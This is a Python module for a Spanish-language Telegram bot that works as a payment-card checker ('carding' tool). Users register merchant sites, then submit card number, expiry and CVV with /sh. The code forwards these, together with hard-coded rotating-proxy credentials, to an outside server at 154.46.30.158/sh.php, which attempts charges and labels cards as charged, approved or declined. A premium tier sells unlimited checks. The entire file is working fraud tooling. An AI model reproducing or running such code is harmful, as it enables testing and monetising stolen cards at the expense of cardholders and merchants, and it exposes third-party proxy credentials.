# commands/shop/sites_manager.py
import sys
import os
import random
import time
import requests
import json
import re
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.database import get_plan, is_premium, get_credits, load_data, save_data
from utils.bin_database import get_bin_info

# LISTA DE PROXYS ALEATORIOS
PROXY_LIST = [
    "p.webshare.io:80:uiwaxqol-rotate:ky0ncy8jz6lo",
    "p.webshare.io:80:lhymcqfk-rotate:c40t0wn62pga", 
    "p.webshare.io:80:nioiisow-rotate:izgswpak25dh"
]

def setup_sites_commands(bot):
    @bot.message_handler(commands=['site', 'sites'])
    def handle_sites_config(message):
        process_sites_config(bot, message)
    
    @bot.message_handler(commands=['sh'])
    def handle_sh_command(message):
        process_sh_check(bot, message)

def process_sites_config(bot, message):
    """Maneja la configuración de sitios (/site, /sites)"""
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            show_sites_help(bot, message, user_id)
            return
        
        sites_to_add = parts[1:]
        
        valid_sites = []
        invalid_sites = []
        
        for site in sites_to_add:
            if is_valid_site(site):
                valid_sites.append(site.lower())
            else:
                invalid_sites.append(site)
        
        if valid_sites:
            update_user_sites(user_id, valid_sites)
        
        response = build_sites_response(valid_sites, invalid_sites, user_id, username)
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error al procesar sitios: {str(e)}")

def process_sh_check(bot, message):
    """Maneja el checkeo con /sh - Premium con 10 usos gratis"""
    user_id = message.from_user.id
    username = message.from_user.first_name
    
    if not is_premium(user_id):
        sh_usage = get_sh_usage_count(user_id)
        if sh_usage >= 10:
            bot.reply_to(message, f"❌ Límite de /sh alcanzado.\n📊 Has usado tus 10 usos gratuitos de /sh\n💎 Obtén Premium para uso ilimitado.")
            return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Uso: `/sh cc|mm|aa|cvv`\nEjemplo: `/sh 4104886655308541|09|29|094`", parse_mode="Markdown")
            return
        
        card_data = parts[1]
        
        if '|' not in card_data:
            bot.reply_to(message, "❌ Formato incorrecto. Use: `/sh cc|mm|aa|cvv`", parse_mode="Markdown")
            return
        
        card_parts = card_data.split('|')
        if len(card_parts) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Use: `/sh cc|mm|aa|cvv`", parse_mode="Markdown")
            return
        
        cc_number, expiry_month, expiry_year, cvv = card_parts
        
        if not (cc_number.isdigit() and len(cc_number) == 16):
            bot.reply_to(message, "❌ Número de tarjeta inválido. Debe tener 16 dígitos")
            return
            
        if not (expiry_month.isdigit() and 1 <= int(expiry_month) <= 12):
            bot.reply_to(message, "❌ Mes de expiración inválido. Use 01-12")
            return
            
        if not expiry_year.isdigit():
            bot.reply_to(message, "❌ Año de expiración inválido. Debe ser numérico")
            return
            
        if len(expiry_year) == 1:
            formatted_year = "0" + expiry_year
        elif len(expiry_year) == 2:
            formatted_year = expiry_year
        elif len(expiry_year) == 4:
            formatted_year = expiry_year[2:]
        else:
            bot.reply_to(message, "❌ Año de expiración inválido. Use 1, 2 o 4 dígitos")
            return
            
        if not (cvv.isdigit() and len(cvv) in [3, 4]):
            bot.reply_to(message, "❌ CVV inválido. Debe tener 3 o 4 dígitos")
            return
        
        user_sites = get_user_sites(user_id)
        if not user_sites:
            bot.reply_to(message, "❌ No tienes sitios configurados.\nUsa `/site tupagina.com` para agregar sitios primero.")
            return
        
        # ESCOGER UN SITIO ALEATORIO
        random_site = random.choice(user_sites)
        
        processing_msg = bot.reply_to(message, f"🔄 Checkeando en {random_site}...\n⏳ Esto puede tomar unos segundos...")
        
        start_time = time.time()
        
        # PROCESAR EL CHECK CON EL SITIO ALEATORIO
        result = process_site_check(random_site, cc_number, expiry_month, formatted_year, cvv)
        
        end_time = time.time()
        processing_time = round(end_time - start_time, 2)
        
        if not is_premium(user_id):
            increment_sh_usage(user_id)
            sh_usage_count = get_sh_usage_count(user_id)
            remaining_sh = max(0, 10 - sh_usage_count)
            usage_line = f"🔄 /sh usados: {sh_usage_count}/10"
        else:
            usage_line = "💎 Premium User"
        
        bin_info = get_bin_info(cc_number[:6])
        credits = get_credits(user_id)
        plan = get_plan(user_id, credits)
        
        bot.delete_message(message.chat.id, processing_msg.message_id)
        
        response_text = build_sh_response(result, random_site, cc_number, expiry_month, expiry_year, cvv, 
                                        bin_info, processing_time, username, plan, usage_line)
        
        bot.reply_to(message, response_text, parse_mode="Markdown")
        
    except Exception as e:
        try:
            if 'processing_msg' in locals():
                bot.delete_message(message.chat.id, processing_msg.message_id)
        except:
            pass
        bot.reply_to(message, f"❌ Error en checkeo: {str(e)}")

def is_valid_site(site):
    clean_site = site.lower().replace('https://', '').replace('http://', '').split('/')[0]
    
    if '.' not in clean_site:
        return False
    
    if not re.match(r'^[a-z0-9.-]+\.[a-z]{2,}$', clean_site):
        return False
    
    return True

def update_user_sites(user_id, new_sites):
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str not in data:
        data[user_id_str] = {}
    
    if 'sites' not in data[user_id_str]:
        data[user_id_str]['sites'] = []
    
    current_sites = data[user_id_str]['sites']
    for site in new_sites:
        if site not in current_sites:
            current_sites.append(site)
    
    if len(current_sites) > 10:
        current_sites = current_sites[:10]
    
    data[user_id_str]['sites'] = current_sites
    save_data(data)

def get_user_sites(user_id):
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str in data and 'sites' in data[user_id_str]:
        return data[user_id_str]['sites']
    return []

def show_sites_help(bot, message, user_id):
    user_sites = get_user_sites(user_id)
    
    if user_sites:
        sites_text = "\n".join([f"• `{site}`" for site in user_sites])
        response = f"""
🌐 **TUS SITIOS CONFIGURADOS** ({len(user_sites)}/10)

{sites_text}

📝 **Para agregar sitios:**
`/site example.com` - Agregar un sitio
`/sites site1.com site2.com` - Agregar múltiples sitios

🔧 **Para checkear:**
`/sh cc|mm|aa|cvv` - Checkear en un sitio aleatorio
"""
    else:
        response = """
🌐 **CONFIGURADOR DE SITIOS**

📝 **Agrega tus sitios para usar con /sh:**

`/site example.com` - Agregar un sitio
`/sites site1.com site2.com` - Agregar múltiples sitios

🔧 **Ejemplos:**
`/site google.com`
`/sites paypal.com stripe.com shopify.com`

💡 **Luego usa:** `/sh 4104886655308541|09|29|094`
"""
    
    bot.reply_to(message, response, parse_mode="Markdown")

def build_sites_response(valid_sites, invalid_sites, user_id, username):
    user_sites = get_user_sites(user_id)
    
    response_parts = []
    
    if valid_sites:
        if len(valid_sites) == 1:
            response_parts.append(f"✅ **Sitio agregado:** `{valid_sites[0]}`")
        else:
            sites_list = "\n".join([f"• `{site}`" for site in valid_sites])
            response_parts.append(f"✅ **Sitios agregados:**\n{sites_list}")
    
    if invalid_sites:
        if len(invalid_sites) == 1:
            response_parts.append(f"❌ **Sitio inválido:** `{invalid_sites[0]}`")
        else:
            invalid_list = "\n".join([f"• `{site}`" for site in invalid_sites])
            response_parts.append(f"❌ **Sitios inválidos:**\n{invalid_list}")
    
    if user_sites:
        sites_count = len(user_sites)
        sites_list = "\n".join([f"• `{site}`" for site in user_sites])
        response_parts.append(f"\n🌐 **Tus sitios ({sites_count}/10):**\n{sites_list}")
    else:
        response_parts.append(f"\n📝 Usa `/site ejemplo.com` para agregar tu primer sitio")
    
    response_parts.append(f"\n🔧 **Para checkear:** `/sh cc|mm|aa|cvv`")
    response_parts.append(f"👤 **Usuario:** {username}")
    
    return "\n".join(response_parts)

def get_sh_usage_count(user_id):
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str in data and 'sh_usage' in data[user_id_str]:
        return data[user_id_str]['sh_usage']
    return 0

def increment_sh_usage(user_id):
    data = load_data()
    user_id_str = str(user_id)
    
    if user_id_str not in data:
        data[user_id_str] = {}
    
    current_usage = data[user_id_str].get('sh_usage', 0)
    data[user_id_str]['sh_usage'] = current_usage + 1
    save_data(data)

def process_site_check(site, cc_number, expiry_month, expiry_year, cvv):
    try:
        # Seleccionar proxy aleatorio
        proxy = random.choice(PROXY_LIST)
        
        # Construir URL exacta como la necesitas
        check_url = f"http://154.46.30.158/sh.php?site={site}&cc={cc_number}|{expiry_month}|{expiry_year}|{cvv}&proxy={proxy}"
        
        # Hacer la solicitud
        response = make_simple_request(check_url)
        
        # Parsear la respuesta JSON
        result_data = parse_sh_response(response)
        
        return {
            'site': site,
            'gateway': result_data['gateway'],
            'amount': result_data['amount'],
            'status': result_data['status'],
            'message': result_data['message'],
            'proxy_ip': result_data['proxy_ip'],
            'success': True
        }
        
    except Exception as e:
        return {
            'site': site,
            'gateway': 'UNKNOWN',
            'amount': '0.0',
            'status': 'ERROR',
            'message': str(e),
            'proxy_ip': '0.0.0.0',
            'success': False
        }

def make_simple_request(url):
    try:
        response = requests.get(url, timeout=30)
        return response.text
    except Exception as e:
        return f"Request Error: {str(e)}"

def parse_sh_response(response):
    """Parsea la respuesta JSON del endpoint sh.php"""
    try:
        data = json.loads(response)
        
        # Mapear la respuesta al formato esperado
        gateway = data.get('Gateway', 'UNKNOWN')
        amount = data.get('Price', '0.0')
        proxy_ip = data.get('ProxyIP', '0.0.0.0')
        response_msg = data.get('Response', 'NO_RESPONSE')
        
        # Convertir todo a mayúsculas para consistencia
        response_upper = response_msg.upper()
        
        # DETERMINAR STATUS BASADO EN CASOS ESPECÍFICOS
        if '3D CC' in response_upper:
            status = 'DECLINED'
        elif 'THANK YOU' in response_upper:
            status = 'CHARGED'
        elif 'APPROVED' in response_upper or 'SUCCESS' in response_upper or 'LIVE' in response_upper:
            status = 'APPROVED'
        elif 'INCORRECTNUMBER' in response_upper:
            status = 'DECLINED'
            response_upper = 'INCORRECT_NUMBER'  # Formatear el resultado
        elif 'DECLINED' in response_upper:
            status = 'DECLINED'
        elif 'INSUFFICIENT_FUNDS' in response_upper:
            status = 'DECLINED'
        elif 'FRAUD' in response_upper:
            status = 'DECLINED'
        elif 'CVV' in response_upper and 'INCORRECT' in response_upper:
            status = 'DECLINED'
        elif 'CARD EXPIRED' in response_upper:
            status = 'DECLINED'
        elif 'PROCESSING ERROR' in response_upper:
            status = 'DECLINED'
        elif 'DO NOT HONOR' in response_upper:
            status = 'DECLINED'
        elif 'PICKUP CARD' in response_upper:
            status = 'DECLINED'
        elif 'RESTRICTED CARD' in response_upper:
            status = 'DECLINED'
        elif 'INVALID TRANSACTION' in response_upper:
            status = 'DECLINED'
        elif 'EXCEEDS WITHDRAWAL' in response_upper:
            status = 'DECLINED'
        elif 'INVALID AMOUNT' in response_upper:
            status = 'DECLINED'
        elif 'LOST CARD' in response_upper:
            status = 'DECLINED'
        elif 'STOLEN CARD' in response_upper:
            status = 'DECLINED'
        else:
            # CUALQUIER OTRO RESULTADO → DECLINED
            status = 'DECLINED'
        
        return {
            'gateway': gateway.upper(),
            'amount': f"{amount}$",
            'status': status,
            'message': response_upper,  # Todo en mayúsculas
            'proxy_ip': proxy_ip
        }
        
    except json.JSONDecodeError:
        return {
            'gateway': 'UNKNOWN',
            'amount': '0.0$',
            'status': 'DECLINED',
            'message': 'INVALID JSON RESPONSE',
            'proxy_ip': '0.0.0.0'
        }

def build_sh_response(result, site, cc, mm, aa, cvv, bin_info, processing_time, username, plan, usage_line):
    """Construye la respuesta en el formato exacto que necesitas"""
    
    # Determinar emoji de status basado en el status procesado
    status = result['status']
    status_upper = str(status).upper()
    
    if 'APPROVED' in status_upper or 'CHARGED' in status_upper:
        status_emoji = "✅"
    elif 'DECLINED' in status_upper:
        status_emoji = "❌" 
    elif 'INSUFFICIENT' in status_upper:
        status_emoji = "💰"
    elif 'FRAUD' in status_upper:
        status_emoji = "🚫"
    elif 'CVV' in status_upper:
        status_emoji = "🔒"
    elif 'EXPIRED' in status_upper:
        status_emoji = "📅"
    else:
        status_emoji = "⚠️"
    
    return f"""
- - - - - - - - - - - - - - - - - - - - -
#Auto | Shopify
- - - - - - - - - - - - - - - - - - - - - 
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ {result['gateway']}
𝗔𝗺𝗺𝗼𝘂𝗻𝘁 ➙ {result['amount']}
- - - - - - - - - - - - - - - - - - - - - 
🝮 Card : {cc}|{mm}|{aa}|{cvv}
🝮 Status : {status} {status_emoji}
🝮 Result : {result['message']}
- - - - - - - - - - - - - - - - - - - - -
🝮 Bin : {bin_info.get('scheme', 'UNKNOWN')} | {bin_info.get('brand', 'UNKNOWN')}
🝮 Country : {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
- - - - - - - - - - - - - - - - - - - - -
🝮 Proxy : Live ✅ | IP : {result['proxy_ip']}
🝮 Time : {processing_time}s
🝮 Checked by : {username} [{plan}]
- - - - - - - - - - - - - - - - - - - - -
"""